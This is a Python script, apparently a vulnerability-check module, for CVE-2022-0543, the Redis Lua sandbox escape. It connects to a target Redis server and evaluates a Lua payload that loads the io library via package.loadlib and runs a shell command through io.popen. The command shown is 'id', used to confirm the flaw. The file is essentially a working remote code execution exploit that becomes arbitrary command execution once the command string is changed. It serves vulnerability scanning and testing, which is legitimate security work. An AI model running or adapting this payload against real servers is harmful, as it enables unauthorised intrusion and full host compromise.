"""
@Author: exiashow
@File: redis_sandbox_rce.py
@Date: 2024/3/6 10:53
@Desc: CVE-2022-0543, Redis Lua Sandbox Escape and Remote Code Execution
@Summary: Redis is an open source (BSD licensed), in-memory data structure store, used as a database, cache, and message broker.
          Reginaldo Silva discovered that due to a packaging issue on Debian/Ubuntu,
          a remote attacker with the ability to execute arbitrary Lua scripts could possibly escape the Lua sandbox and execute arbitrary code on the host.
"""

from urllib.parse import urlparse
import redis
import sys

exploit_script = """
    local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io");
    local io = io_l();
    local f = io.popen("id", "r");
    local res = f:read("*a");
    f:close();
    return res
"""


def extract_domain(url):
    """
    Extract the domain name of the URL
    """
    parsed_url = urlparse(url)
    if parsed_url.hostname:
        return parsed_url.hostname
    else:
        return None


class RedisSandboxRce(object):
    def __init__(self, url):
        self.url = url

    def run(self):
        target_host = extract_domain(self.url)
        target_port = 6379

        try:
            r = redis.Redis(host=target_host, port=target_port)
            result = r.eval(exploit_script, 0)
            if "uid" in str(result):
                return "[Warning] Redis vulnerability discovered: CVE-2022-0543"
            else:
                return None
        except redis.exceptions.ResponseError:
            return None


if __name__ == "__main__":
    fallingSword = RedisSandboxRce(sys.argv[1])
    print(fallingSword.run())
